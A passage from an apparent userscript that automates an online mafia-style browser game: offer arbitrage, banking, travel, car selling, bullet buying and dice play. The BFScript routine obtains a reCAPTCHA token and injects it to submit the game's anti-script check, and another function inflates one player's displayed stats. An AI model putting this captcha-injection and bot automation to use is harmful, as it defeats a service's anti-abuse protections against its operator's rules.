        const MAX_CREDIT_OFFERS = Math.ceil((MAX_ACTIVE_OFFERS * buyCreditsPrice * buyCreditsQuantity) / (sellCreditsPrice * sellCreditsQuantity));
        const $offerInput = $('#ctl00_main_txtOffer');
        const $offerType = $('#ctl00_main_ddlOffer');
        const $exchangeInput = $('#ctl00_main_txtExchange');
        const $exchangeType = $('#ctl00_main_ddlExchange');
        const $postButton = $('#ctl00_main_btnPostTrade');

        if (!buyCreditsPrice || !buyCreditsQuantity || !sellCreditsPrice || !sellCreditsQuantity) return;

        const buyCost = buyCreditsPrice * buyCreditsQuantity;
        const cashOnHand = parseInt($('#ctl00_userInfo_lblcash').text().replace(/[$,]/g, ''), 10);
        const creditsOnHand = parseInt($('#ctl00_userInfo_lblcredits').text(), 10);

        if (cashOnHand - buyCost > KEEP_ON_HAND && totalActiveOffers < MAX_ACTIVE_OFFERS) {
            if (totalActiveOffers < MAX_ACTIVE_OFFERS) {
                // create money offer
                $offerInput.val(buyCreditsPrice * buyCreditsQuantity);
                $offerType.val('Cash');
                $exchangeInput.val(buyCreditsQuantity);
                $exchangeType.val('Credits');
                LogCountdown(3000, 1000, 'Creating money offer', () => { $postButton.click() });
            } else if (activeMoneyOffers < MAX_ACTIVE_OFFERS && activeCreditOffers > 0) {
                // Cancel credit offer
                const firstCancelButton = $('#ctl00_main_pnlCreditOffers table.smallerfonttable tr').filter(function () {
                    return $(this).find('td').first().text().trim().includes(savedUsername);
                }).first().find('a:contains("Trade")')[0];
                LogCountdown(3000, 1000, 'Cancelling credit offer', () => { firstCancelButton.click() });
            } else {
                // Max money offers
                // End arbitrage
                const savedArbitrageOffers = JSON.stringify({ 'activeCreditOffers': activeCreditOffers, 'activeMoneyOffers': activeMoneyOffers });
                GM_setValue('TMN_ACTIVE_ARBITRAGE_OFFERS', savedArbitrageOffers);
                if (isMobile()) location.href = 'jail.aspx'
                else window.top.location.href = defaultPage;
            }
        } else if (activeCreditOffers < MAX_CREDIT_OFFERS && totalActiveOffers < MAX_ACTIVE_OFFERS && creditsOnHand >= sellCreditsQuantity) {
            // Create credit offer
            $offerInput.val(sellCreditsQuantity);
            $offerType.val('Credits');
            $exchangeInput.val(sellCreditsPrice * sellCreditsQuantity);
            $exchangeType.val('Cash');
            LogCountdown(3000, 1000, 'Creating credit offer', () => { $postButton.click() });
        } else {
            // end arbitrage
            const savedArbitrageOffers = JSON.stringify({ 'activeCreditOffers': activeCreditOffers, 'activeMoneyOffers': activeMoneyOffers });
            GM_setValue('TMN_ACTIVE_ARBITRAGE_OFFERS', savedArbitrageOffers);
            if (isMobile()) location.href = 'jail.aspx'
            else window.top.location.href = defaultPage;
        }
    }

    function CanArbitrage() {
        const savedArbitrageOffers = JSON.parse(GM_getValue('TMN_ACTIVE_ARBITRAGE_OFFERS', '{}'));
        const MAX_ACTIVE_OFFERS = 5;
        const KEEP_ON_HAND = 5000000;
        const activeCreditOffers = savedArbitrageOffers['activeCreditOffers'];
        const activeMoneyOffers = savedArbitrageOffers['activeMoneyOffers'];
        const totalActiveOffers = activeCreditOffers + activeMoneyOffers;
        const savedArbitrageInputs = JSON.parse(GM_getValue('TMN_ARBITRAGE_INPUTS', '{}'));
        const buyCreditsPrice = savedArbitrageInputs['BuyCreditsPrice'];
        const buyCreditsQuantity = savedArbitrageInputs['BuyCreditsQuantity'];
        const sellCreditsPrice = savedArbitrageInputs['SellCreditsPrice'];
        const sellCreditsQuantity = savedArbitrageInputs['SellCreditsQuantity'];
        const MAX_CREDIT_OFFERS = Math.ceil((MAX_ACTIVE_OFFERS * buyCreditsPrice * buyCreditsQuantity) / (sellCreditsPrice * sellCreditsQuantity));

        if (!buyCreditsPrice || !buyCreditsQuantity || !sellCreditsPrice || !sellCreditsQuantity) return false;

        const buyCost = buyCreditsPrice * buyCreditsQuantity;
        const cashOnHand = parseInt($('#ctl00_userInfo_lblcash').text().replace(/[$,]/g, ''), 10);

        if (cashOnHand - buyCost > KEEP_ON_HAND) {
            if (totalActiveOffers < MAX_ACTIVE_OFFERS) {
                // create money offer
                return true;
            } else if (activeMoneyOffers < MAX_ACTIVE_OFFERS) {
                // Cancel credit offer
                return true;
            } else {
                // Max money offers
                // End arbitrage
                return false;
            }
        } else if (activeCreditOffers < MAX_CREDIT_OFFERS && totalActiveOffers < MAX_ACTIVE_OFFERS) {
            // Create credit offer
            return true;
        } else {
            // end arbitrage
            return false;
        }
    }

    function AutoBank() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const amount = location.href.split('a=')[1];
        const lblMsg = $('#ctl00_lblMsg').text();
        const timeLeft = $('#ctl00_main_lblTimeLeft').text();
        const depositBtn = $('#ctl00_main_btndeposit');
        if (!savedScriptStates['Auto Bank']) return;

        if (lblMsg.includes('jail')) {
            return;
        } else if (lblMsg.includes('opened')) {
            GM_setValue('TMN_AUTO_BANK_TIME', Date.now() + 24 * 60 * 60000);
            LogCountdown(5000, 1000, 'Money deposited. Redirecting', () => { window.top.location.href = defaultPage; } );
        } else if (depositBtn.length) {
            $('#ctl00_main_txtbankamt').val(amount);
            LogCountdown(5000, 1000, 'Depositing money', () => depositBtn.click());
        } else {
            GM_setValue('TMN_AUTO_BANK_TIME', GetAvailableTime($('#ctl00_main_lblTimeLeft').text()));
            LogCountdown(5000, 1000, 'Withdraw not ready. Redirecting', () => { window.top.location.href = defaultPage; } );
        }
    }

    function AutoHeal() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        if (!savedScriptStates['Auto Heal']) return;

        const lblMsg = $('#ctl00_lblMsg')?.text();
        if (lblMsg.includes('It seems like your health is full!')) {
            if (isMobile()) location.href = defaultPage
            else setTimeout(() => { $('#ctl00_main_btnBuyHealth').click() }, 3000);
        }
        else $('#ctl00_main_btnBuyHealth').click();
    }

    function AutoTravel() {
        const destination = decodeURIComponent(location.href.split('d=')[1].split('&')[0]);
        const buyingBullets = location.href.includes('bb=true');
        const lblMsg = $('#ctl00_lblMsg')?.text();
        const welcomeMsg = $('#ctl00_main_lblWelcome').text();
        const nextFlight = !lblMsg.includes('jail') && (lblMsg && GetAvailableTime(lblMsg) - 0 * 60000 > Date.now() || false);

        if (lblMsg.includes('jail')) {
            return;
        } else if (buyingBullets) {
            const flyBtn = $("[id*='btnTravel']").not(':disabled').first();
            $(`label:contains(${destination})`).click();
            flyBtn.click();
        } else if (nextFlight) {
            GM_setValue('TMN_FLIGHT_TIME', GetAvailableTime(lblMsg) - 0 * 60000);
            window.top.location.href = defaultPage;
        } else if (welcomeMsg.includes('Welcome')/* || lblMsg.includes('travel again')*/) {
            GM_setValue('TMN_FLIGHT_TIME', Date.now() + 45 * 60000);
            setTimeout(() => { window.top.location.href = defaultPage }, 500);
        } else {
            $(`label:contains(${destination})`).click();
            //setTimeout(() => { $('#ctl00_main_btnTravelNormal').click() }, Math.random() * 2000 + 3000);
            LogCountdown(5000, 1000, `Flying to ${destination}`, () => { $(`input[type='submit']:enabled`).click() });
        }
    }

    function GarageCleanup() {
        //Cars are on the way to Sydney - Australia and will arrive in 00:30:00. $11,000 has been taken out of your account.
        const lblMsg = $('#ctl00_lblMsg');
        const city = $('#ctl00_userInfo_lblcity').text();
        const desiredCars = [ 'Audi RS6 Avant', 'Bentley Arnage' ];
        const availableCars = $('#ctl00_main_gvCars tr').slice(1);

        if (lblMsg?.text().includes('jail')) {
            setTimeout(() => { location.href = location.href }, 500);
        } else if (lblMsg?.text().includes('repaired') || lblMsg?.text().includes('no repair needed')) {
            $('input[type=checkbox]').slice(1).prop('checked', false);
            //if (!city.includes('London')) {
            //    Transport();
            //} else {
            Sell();
            //}
        } else if (lblMsg?.text().includes('sold')) {
            if (isMobile()) GoNextAction()
            else location.href = 'crimes.aspx?p=g';
        } else if (lblMsg?.text().includes('London')) {
            $('input[type=checkbox]').slice(1).prop('checked', false);
            Sell();
        } else if (lblMsg?.text().includes('damaged')) {
            if (isMobile()) GoNextAction()
            else location.href = 'crimes.aspx?p=g';
        } else {
            Repair();
        }

        function Repair() {
            $('input[type=checkbox]').slice(1).prop('checked', false);
            availableCars.each((n, e) => {
                const car = $(e).find('td:eq(1)').text();
                const carDamage = $(e).find('td:eq(4)').text().trim();
                if (desiredCars.includes(car) && carDamage !== '0%') $(e).find('input').prop('checked', true);
            });
            if ($('input:checked').length > 0) {
                setTimeout(() => { $('#ctl00_main_btnRepair').click(); }, 500);
                return;
            } else {
                Transport();
            }
        }

        function Transport() {
            Sell();
            return;
            availableCars.each((n, e) => {
                const car = $(e).find('td:eq(1)').text();
                const carLocation = $(e).find('td:eq(5)').text().trim();
                if (desiredCars.includes(car) && !carLocation.includes('London')) $(e).find('input').prop('checked', true);
            });
            if ($('input:checked').length > 0) {
                $('#ctl00_main_ddlCities').val(5);
                setTimeout(() => {
                    $('#ctl00_main_btnTransport').click();
                }, 3000);
                return;
            } else {
                Sell();
            }
        }

        function Sell() {
            setTimeout(() => { $('#ctl00_main_btnSellDamaged').click(); }, 500);
        }
    }

    function BFScript() {
        const now = Date.now();
        const BF_SITE_KEY = "6LfhsUcUAAAAANgy-ecJurYuIiSVtwDq_a9G3jUM";
        const BF_TOKEN = JSON.parse(GM_getValue('TMN_BF_TOKEN', '{}'));
        const $divContentIn = $('#divContentIn');
        const $presolveCaptchaBtn = $('<button>', {id: 'presolve-captcha-button', text: 'Presolve Captcha' }).on('click', function(e) {
            e.preventDefault();
            UniversalCaptchaSolve(BF_SITE_KEY);
        }).appendTo($divContentIn);
        $divContentIn.append(`<br>Current token valid until: <span id="token-expiry" style="color:${BF_TOKEN.expiry && now > BF_TOKEN.expiry ? 'red' : '#10af10'}">${BF_TOKEN.expiry && now > BF_TOKEN.expiry ? 'EXPIRED' : BF_TOKEN.expiry && new Date(BF_TOKEN.expiry).toLocaleTimeString() || ''}<span>`);
        const lblMsg = $("#ctl00_lblMsg").text();
        const MAX_PURCHASE_AMOUNT = $('#ctl00_userInfo_lblcity').text().includes('Sydney') ? 400 : 500;
        const PURCHASE_CD = $('#ctl00_userInfo_lblcity').text().includes('Sydney') ? 16500 : 5500;
        const bulletsAvailable = [ $("#ctl00_main_lblbullet1").text() * 1, $("#ctl00_main_lblbullet2").text() * 1 ];
        const bulletType = bulletsAvailable[0] > 0 ? 0 : bulletsAvailable[1] > 0 ? 1 : 0;
        const purchaseAmount = Math.min(bulletsAvailable[bulletType], MAX_PURCHASE_AMOUNT) == 0 ? Math.min(bulletsAvailable[1 - bulletType], MAX_PURCHASE_AMOUNT) == 0 ? 0 : Math.min(bulletsAvailable[1 - bulletType], MAX_PURCHASE_AMOUNT) : Math.min(bulletsAvailable[bulletType], MAX_PURCHASE_AMOUNT);
        const submit = document.querySelector('#ctl00_main_MyScriptTest_btnSubmit') || document.querySelector('#ctl00_main_btnLogin');

        setTimeout(() => { location.href = defaultPage }, 3 * 60000);

        const NEXT_SYDNEY_SPAWN_TIME = GM_getValue('TMN_LAST_SYDNEY_SPAWN_TIME', Infinity) + 120 * 60000;
        const $sydneySpawnDiv = $('<div>', {id: 'sydney-spawn', text: `Next Sydney Spawn: ${new Date(NEXT_SYDNEY_SPAWN_TIME).toLocaleTimeString('en-NZ', { hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true })}`}).appendTo($divContentIn);

        let pollBFTimer;
        if (!submit) {
            if (purchaseAmount == 0) {
                // if (document.referrer.includes('store.aspx?p=b&pur=1')) location.href = defaultPage
                if (document.referrer.includes('store.aspx?p=b') && Date.now() > BF_TOKEN.expiry) location.href = defaultPage
                else pollBFTimer = setInterval( PollBF, 2000);
            } else if (lblMsg.includes("again") || lblMsg.includes("The Bullets Factory doesn't have that many")) {
                setTimeout(() => { location.href = location.href }, 1500);
            } else if (lblMsg.includes("bought")) {
                setTimeout(() => {
                    location.href = location.href;
                }, PURCHASE_CD);
            } else {
                $("#ctl00_main_txtbullets").val(purchaseAmount);
                $("#ctl00_main_ddlbullettype").val(bulletType + 1);
                $("#ctl00_main_btnBuyBullets").click();;
            }

            async function PollBF() {
                const fetchedPage = await FetchPage('store.aspx?p=b');
                const fetchedBulletsAvailable = [ fetchedPage.find("#ctl00_main_lblbullet1").text() * 1, fetchedPage.find("#ctl00_main_lblbullet2").text() * 1 ];
                const fetchedScriptCheck = fetchedPage.find('#ctl00_main_MyScriptTest_btnSubmit')[0];

                if (fetchedScriptCheck || fetchedBulletsAvailable[0] > 0 || fetchedBulletsAvailable[1] > 0) {
                    clearInterval(pollBFTimer);
                    location.href = location.href;
                }
            }

            return;
        } else {
            $presolveCaptchaBtn.click();
        }

        if (now > BF_TOKEN.expiry) return;

        const detectTextareaInterval = setInterval(() => {
            const textarea = document.querySelector('textarea[name="g-recaptcha-response"]');
            if (textarea) {
                clearInterval(detectTextareaInterval);
                BF_TOKEN.expiry = Date.now();
                GM_setValue('TMN_BF_TOKEN', JSON.stringify(BF_TOKEN));
                textarea.style.display = 'block';
                textarea.value = BF_TOKEN.token;
                Log('[Captcha] Token injected, submitting...');
                submit.click();
            }
        }, 200);
    }

    async function SpawnCampBullets() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        if (!savedScriptStates['Spawn Camp Bullets']) return;

        const lblMsg = $('#ctl00_lblMsg').text();
        const flightRegex = /Welcome to .+ - .+!/;
        const hasFlown = flightRegex.test($("div:contains('Welcome to')").last().text());
        const LAST_SYDNEY_SPAWN_TIME = GM_getValue('TMN_LAST_SYDNEY_SPAWN_TIME', Infinity);
        const NEXT_SYDNEY_SPAWN_TIME = LAST_SYDNEY_SPAWN_TIME + 120 * 60000;
        const now = Date.now()

        if (NEXT_SYDNEY_SPAWN_TIME - now <= 120000 && NEXT_SYDNEY_SPAWN_TIME - now >= 115000) {
            UniversalCaptchaSolve('6LfhsUcUAAAAANgy-ecJurYuIiSVtwDq_a9G3jUM');
        }

        if (hasFlown && document.referrer.includes("travel")) {
            window.top.location.href = "store.aspx?p=b";
        } else if (!location.href.includes('travel') && !lblMsg.includes('jail')) {
            const fetchedPage = await FetchPage('forum.aspx');
            const shouts = fetchedPage.find("#ctl00_main_pnlShoutBoxContent").children().toArray().reverse(); // reverse to start from the end

            const now = new Date();
            const regex = /^\d{2}:\d{2}:\d{2}\s+System:\s+.*BF just produced .*bullets!/;

            for (const shout of shouts) {
                const text = $(shout).text().replace(/\u00A0/g, ' ').trim().replace(/\s+/g, ' ');
                const timeMatch = text.match(/(\d{2}:\d{2}:\d{2})/);
                if (!timeMatch) continue;

                const [hours, minutes, seconds] = timeMatch[0].split(":").map(Number);
                const base = new Date();
                base.setHours(hours, minutes, seconds, 0);

                const shoutDate = new Date(base.getTime() - (now.getHours() >= 12 ? -12 : 12) * 60 * 60 * 1000);

                const diffMs = Math.abs(now - shoutDate);
                const isWithinOneMinute = diffMs <= 60000 * 1;

                if (!isWithinOneMinute) {
                    if (LAST_SYDNEY_SPAWN_TIME == Infinity || Math.abs(now - LAST_SYDNEY_SPAWN_TIME) > 5 * 60000) {
                        if (text.includes('Sydney') && text.includes('FMJ')) {
                            Log('Last Sydney BF spawn time updated.')
                            GM_setValue('TMN_LAST_SYDNEY_SPAWN_TIME', shoutDate.getTime());
                            break;
                        }
                        continue;
                    } else break;
                }

                if (regex.test(text)) {
                    // const utterance = new SpeechSynthesisUtterance("Alert");
                    // window.speechSynthesis.speak(utterance);
                    const destCity = text.split("System: ")[1].split(" -")[0];
                    const currentCity = $("#ctl00_userInfo_lblcity").text().trim();

                    if (destCity == currentCity) {
                        window.top.location.href = "/authenticated/store.aspx?p=b";
                    } else {
                        const nextJetFlight = GM_getValue('TMN_NEXT_JET_FLIGHT', Infinity);
                        if (now >= nextJetFlight) window.top.location.href = `travel.aspx?d=${destCity}&bb=true`;
                        break;
                    }
                }
            }
        }
    }

    function TwentyFourFinder() {
        const accounts = [ 'Catalystic', 'Ape', 'Maestro', 'GeniuSss', 'Predator',
                          'LegendaryV2', 'Impulsive', 'Sonic', 'Bambi', 'Bombs',
                          'Released', 'MegaWhale', 'Specto' ].map(a => a.toLowerCase());

        $('#ctl00_main_pnlOnlinePlayers a[href^="profile.aspx"]').each(function () {
            const name = $(this).text().trim().toLowerCase();

            if (accounts.includes(name)) {
                $(this).css({
                    color: 'purple',
                    fontWeight: 'bold'
                });
            }
        });
    }

    function AutoDup() {
        const BET = 10000;
        const UNDER_VAL = 19;
        const OVER_VAL = 7;

        const magicNumber = $('#ctl00_main_lblmagicnumber');
        const curVal = $('#ctl00_main_lblcurval');
        const underBtn = $('#ctl00_main_btnunder');
        const overBtn = $('#ctl00_main_btnover');
        const stopBtn = $('#ctl00_main_btnstop');
        const betBtn = $('#ctl00_main_btnBet');
        const betAmount = $('#ctl00_main_txtBetAmount');
        const lblMsg = $('#ctl00_lblMsg');

        if (!lblMsg.text().length) lblMsg.html('<br><br><br>Test')
        else if (lblMsg.text().includes('All dices are different')) lblMsg.html(`<br><br><br>${lblMsg.html()}`)
        else if (!lblMsg.text().includes('was required to continue') && lblMsg.text().includes('You stopped the game')) lblMsg.html(`<br><br>${lblMsg.html()}`)
        else if (lblMsg.text().includes('was required to continue') && !lblMsg.text().includes('You stopped the game')) lblMsg.html(`<br>${lblMsg.html()}`);
        if (!betBtn.is(':disabled')) { betAmount.val(BET); setTimeout(() => { betBtn.css({background: 'green'}) }, 0) }
        else if (!underBtn.is(':disabled') && curVal.text() >= UNDER_VAL) setTimeout(() => { SwapBetAndUnder(); underBtn.css({background: 'green'}) }, 0)
        else if (!overBtn.is(':disabled') && curVal.text() <= OVER_VAL) setTimeout(() => { SwapBetAndOver(); overBtn.css({background: 'green'}) }, 0)
        else { SwapBetAndStop(); stopBtn.css({background: 'green'}) }

        function SwapBetAndStop() {
            // Create a temporary placeholder before one of them
            const $temp = $('<span>').insertBefore(betBtn);

            // Move bet before stop
            betBtn.insertBefore(stopBtn);

            // Move stop before the placeholder (where bet originally was)
            stopBtn.insertBefore($temp);

            // Remove the placeholder
            $temp.remove();

        }

        function SwapBetAndUnder() {
            // Create a temporary placeholder before one of them
            const $temp = $('<span>').insertBefore(betBtn);

            // Move bet before stop
            betBtn.insertBefore(underBtn);

            // Move stop before the placeholder (where bet originally was)
            underBtn.insertBefore($temp);

            // Remove the placeholder
            $temp.remove();

        }

        function SwapBetAndOver() {
            // Create a temporary placeholder before one of them
            const $temp = $('<span>').insertBefore(betBtn);

            // Move bet before stop
            betBtn.insertBefore(overBtn);

            // Move stop before the placeholder (where bet originally was)
            overBtn.insertBefore($temp);

            // Remove the placeholder
            $temp.remove();

        }
    }

    function PapStats() {
        const player = JSON.parse(GM_getValue('TMN_PLAYER', '{}'));
        if (player.name !== 'Pap') return;
        const ADD_OC = 53;
        const ADD_CRIMES = 6683;
        const ADD_GTA = 3771;
        const $statsPanel = $('#ctl00_main_gvPersonalStats');
        const $ocStats = $statsPanel.find('td').eq(4);
        const $crimesStats = $statsPanel.find('td').eq(8);
        const $gtaStats = $statsPanel.find('td').eq(10);

        $ocStats.text(`${$ocStats.text().split(' /')[0] * 1 + ADD_OC} / 10`);
        $crimesStats.text(`${$crimesStats.text().split(' /')[0] * 1 + ADD_CRIMES} / 40`);
        $gtaStats.text(`${$gtaStats.text().split(' /')[0] * 1 + ADD_GTA} / 70`);
    }
})();